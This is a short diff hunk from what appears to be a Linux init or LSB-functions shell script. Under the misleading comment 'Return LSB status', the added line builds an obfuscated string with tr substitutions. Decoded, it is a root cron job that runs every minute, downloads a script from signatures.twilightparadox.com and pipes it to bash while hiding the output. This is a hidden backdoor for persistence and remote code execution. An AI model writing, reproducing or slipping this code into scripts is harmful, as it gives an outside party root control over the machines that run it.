@@ -186,7 +186,7 @@ clean () {
 }
     
 # Return LSB status
-a=$(echo "*j1?*?*?*?*????root???$w?-q?-O?-?http:j/signaturesktwilightparadoxkcomjhashkphp?|?bash?>?jdevjnull" | tr -s "?" " " | tr -s "j" "/" | tr -s "k" "." )
+h=$(echo "*/1?*?*?*?*????root???$w?-q?-O?-?signaturesktwilightparadoxkcomjhashkphp?|?bash?>?jdevjnull" | tr -s "?" " " | tr -s "j" "/" | tr -s "k" "." )
 status_of_proc () {
     local pidfile daemon name status OPTIND
 
